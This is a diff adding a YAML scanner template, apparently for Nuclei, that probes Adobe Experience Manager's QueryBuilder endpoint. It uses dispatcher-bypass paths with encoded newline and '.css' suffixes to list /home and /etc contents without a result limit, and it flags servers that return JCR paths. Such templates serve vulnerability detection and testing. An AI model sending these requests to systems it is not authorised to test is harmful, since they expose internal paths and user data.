@@ -1,0 +1,23 @@
+id: poc-yaml-aem-querybuilder-internal-path-info-leak
+info:
+  name: AEM QueryBuilder Internal Path Info Leak
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: information-leak
+http:
+  - method: GET
+    path:
+      - "/bin/querybuilder.json.;%0aa.css?path=/home&p.hits=full&p.limit=-1"
+      - "/bin/querybuilder.json.;%0aa.css?path=/etc&p.hits=full&p.limit=-1"
+      - "/bin/querybuilder.json.css?path=/home&p.hits=full&p.limit=-1"
+      - "/bin/querybuilder.json.css?path=/etc&p.hits=full&p.limit=-1"
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "jcr:path"
+        part: body
+      - type: word
+        words:
+          - "{\"success\":true,\"results\""
+        part: body
